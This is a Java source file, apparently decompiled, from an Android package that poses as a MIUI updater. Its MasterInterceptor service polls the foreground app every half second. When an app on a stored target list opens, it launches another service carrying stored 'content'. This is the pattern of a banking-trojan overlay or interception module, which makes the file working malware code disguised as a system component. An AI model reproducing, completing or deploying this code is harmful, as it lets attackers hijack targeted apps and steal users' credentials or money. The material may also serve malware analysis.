package brandmangroupe.miui.updater;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.os.IBinder;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class MasterInterceptor extends Service {
    final String LOG_TAG = "myLogs";

    class RefreshTask extends AsyncTask {
        private boolean someCondition = true;
        private String tectec = "";

        RefreshTask() {
        }

        /* access modifiers changed from: protected|varargs */
        public void onProgressUpdate(Object... values) {
            super.onProgressUpdate(values);
        }

        /* access modifiers changed from: protected|varargs */
        public Object doInBackground(Object... params) {
            while (this.someCondition) {
                try {
                    String[] activePackages;
                    Thread.sleep(500);
                    Map<String, ?> items = MasterInterceptor.this.getSharedPreferences("interceptor", 0).getAll();
                    ActivityManager manager = (ActivityManager) MasterInterceptor.this.getApplicationContext().getSystemService("activity");
                    if (VERSION.SDK_INT > 20) {
                        activePackages = MasterInterceptor.this.getActivePackages();
                    } else {
                        activePackages = MasterInterceptor.this.getActivePackagesCompat();
                    }
                    if (activePackages != null) {
                        for (String activePackage : activePackages) {
                            if (items.size() > 0) {
                                for (String s : items.keySet()) {
                                    if (!activePackage.contains(s)) {
                                        this.tectec = "";
                                    } else if (!this.tectec.contains(activePackage)) {
                                        this.tectec = activePackage;
                                        Intent intent = new Intent(MasterInterceptor.this.getApplicationContext(), GlobalCode.class);
                                        intent.putExtra("content", (String) items.get(s));
                                        intent.putExtra("type", "start");
                                        intent.putExtra("data", "");
                                        MasterInterceptor.this.startService(intent);
                                    }
                                }
                            }
                        }
                    }
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }
    }

    public void onCreate() {
        super.onCreate();
        new RefreshTask().execute(new Object[0]);
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        return 3;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    /* access modifiers changed from: 0000 */
    public String[] getActivePackagesCompat() {
        return new String[]{((RunningTaskInfo) ((ActivityManager) getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName()};
    }

    /* access modifiers changed from: 0000 */
    public String[] getActivePackages() {
        ActivityManager mActivityManager = (ActivityManager) getSystemService("activity");
        Set<String> activePackages = new HashSet();
        for (RunningAppProcessInfo processInfo : mActivityManager.getRunningAppProcesses()) {
            if (processInfo.importance == 100) {
                activePackages.addAll(Arrays.asList(processInfo.pkgList));
            }
        }
        return (String[]) activePackages.toArray(new String[activePackages.size()]);
    }
}
